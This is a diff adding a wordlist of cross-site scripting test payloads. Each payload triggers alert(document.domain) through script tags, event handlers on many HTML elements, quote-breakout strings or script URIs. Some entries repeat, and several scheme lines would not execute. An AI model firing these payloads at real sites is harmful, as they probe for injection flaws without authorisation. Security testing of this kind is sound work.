@@ -1,0 +1,147 @@
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<body onload=alert(document.domain)>
+<iframe src="javascript:alert(document.domain)">
+<details open ontoggle=alert(document.domain)>
+<video><source onerror=alert(document.domain)></video>
+<audio src=x onerror=alert(document.domain)>
+<form><button formaction="javascript:alert(document.domain)">X</button>
+<input onfocus=alert(document.domain) autofocus>
+<marquee onstart=alert(document.domain)>
+<isindex onmouseover=alert(document.domain)>
+<textarea onfocus=alert(document.domain) autofocus>
+<keygen onfocus=alert(document.domain) autofocus>
+<select onfocus=alert(document.domain) autofocus>
+<frameset onload=alert(document.domain)>
+<applet onerror=alert(document.domain)>
+<embed src=javascript:alert(document.domain)>
+<object data=javascript:alert(document.domain)>
+<base href=javascript:alert(document.domain)>
+<link href=javascript:alert(document.domain) rel=stylesheet>
+<math onmouseover=alert(document.domain)>
+<template onmouseover=alert(document.domain)>
+<progress onmouseover=alert(document.domain)>
+<meter onmouseover=alert(document.domain)>
+<output onmouseover=alert(document.domain)>
+<datalist onmouseover=alert(document.domain)>
+<dialog onmouseover=alert(document.domain)>
+<menu onmouseover=alert(document.domain)>
+<menuitem onmouseover=alert(document.domain)>
+<summary onmouseover=alert(document.domain)>
+<command onmouseover=alert(document.domain)>
+<source onerror=alert(document.domain)>
+<track onerror=alert(document.domain)>
+<map onmouseover=alert(document.domain)>
+<area onmouseover=alert(document.domain) shape=rect coords=0,0,100,100>
+<param onmouseover=alert(document.domain)>
+<col onmouseover=alert(document.domain)>
+<colgroup onmouseover=alert(document.domain)>
+<tfoot onmouseover=alert(document.domain)>
+<thead onmouseover=alert(document.domain)>
+<tbody onmouseover=alert(document.domain)>
+<tr onmouseover=alert(document.domain)>
+<td onmouseover=alert(document.domain)>
+<th onmouseover=alert(document.domain)>
+<caption onmouseover=alert(document.domain)>
+<legend onmouseover=alert(document.domain)>
+<fieldset onmouseover=alert(document.domain)>
+<optgroup onmouseover=alert(document.domain)>
+<option onmouseover=alert(document.domain)>
+<label onmouseover=alert(document.domain)>
+<button onmouseover=alert(document.domain)>
+<address onmouseover=alert(document.domain)>
+<article onmouseover=alert(document.domain)>
+<aside onmouseover=alert(document.domain)>
+<footer onmouseover=alert(document.domain)>
+<header onmouseover=alert(document.domain)>
+<main onmouseover=alert(document.domain)>
+<nav onmouseover=alert(document.domain)>
+<section onmouseover=alert(document.domain)>
+<blockquote onmouseover=alert(document.domain)>
+<cite onmouseover=alert(document.domain)>
+<code onmouseover=alert(document.domain)>
+<pre onmouseover=alert(document.domain)>
+<q onmouseover=alert(document.domain)>
+<samp onmouseover=alert(document.domain)>
+<var onmouseover=alert(document.domain)>
+<abbr onmouseover=alert(document.domain)>
+<bdo onmouseover=alert(document.domain)>
+<big onmouseover=alert(document.domain)>
+<center onmouseover=alert(document.domain)>
+<dir onmouseover=alert(document.domain)>
+<font onmouseover=alert(document.domain)>
+<frame onmouseover=alert(document.domain)>
+<frameset onmouseover=alert(document.domain)>
+<noframes onmouseover=alert(document.domain)>
+<strike onmouseover=alert(document.domain)>
+<tt onmouseover=alert(document.domain)>
+<u onmouseover=alert(document.domain)>
+<xmp onmouseover=alert(document.domain)>
+<plaintext onmouseover=alert(document.domain)>
+<listing onmouseover=alert(document.domain)>
+<nextid onmouseover=alert(document.domain)>
+<noembed onmouseover=alert(document.domain)>
+<noscript onmouseover=alert(document.domain)>
+<acronym onmouseover=alert(document.domain)>
+<applet onmouseover=alert(document.domain)>
+<basefont onmouseover=alert(document.domain)>
+<bgsound onmouseover=alert(document.domain)>
+<blink onmouseover=alert(document.domain)>
+<canvas onmouseover=alert(document.domain)>
+<content onmouseover=alert(document.domain)>
+<data onmouseover=alert(document.domain)>
+<datalist onmouseover=alert(document.domain)>
+<element onmouseover=alert(document.domain)>
+<embed onmouseover=alert(document.domain)>
+<figcaption onmouseover=alert(document.domain)>
+<figure onmouseover=alert(document.domain)>
+<footer onmouseover=alert(document.domain)>
+<header onmouseover=alert(document.domain)>
+<hgroup onmouseover=alert(document.domain)>
+<keygen onmouseover=alert(document.domain)>
+<mark onmouseover=alert(document.domain)>
+<menu onmouseover=alert(document.domain)>
+<menuitem onmouseover=alert(document.domain)>
+<meter onmouseover=alert(document.domain)>
+<nav onmouseover=alert(document.domain)>
+<output onmouseover=alert(document.domain)>
+<progress onmouseover=alert(document.domain)>
+<rp onmouseover=alert(document.domain)>
+<rt onmouseover=alert(document.domain)>
+<ruby onmouseover=alert(document.domain)>
+<section onmouseover=alert(document.domain)>
+<source onmouseover=alert(document.domain)>
+<summary onmouseover=alert(document.domain)>
+<template onmouseover=alert(document.domain)>
+<time onmouseover=alert(document.domain)>
+<track onmouseover=alert(document.domain)>
+<video onmouseover=alert(document.domain)>
+<wbr onmouseover=alert(document.domain)>
+<xml onmouseover=alert(document.domain)>
+<xmp onmouseover=alert(document.domain)>
+'" onmouseover="alert(document.domain)
+' onmouseover='alert(document.domain)
+` onmouseover=`alert(document.domain)
+\" onmouseover=\"alert(document.domain)
+javascript:alert(document.domain)
+data:text/html,<script>alert(document.domain)</script>
+vbscript:alert(document.domain)
+livescript:alert(document.domain)
+mocha:alert(document.domain)
+ecmascript:alert(document.domain)
+jscript:alert(document.domain)
+ws:alert(document.domain)
+wss:alert(document.domain)
+about:alert(document.domain)
+jar:alert(document.domain)
+ldap:alert(document.domain)
+ldaps:alert(document.domain)
+gopher:alert(document.domain)
+telnet:alert(document.domain)
+news:alert(document.domain)
+mailto:alert(document.domain)
+file:alert(document.domain)
+ftp:alert(document.domain)
+http:alert(document.domain)
+https:alert(document.domain)
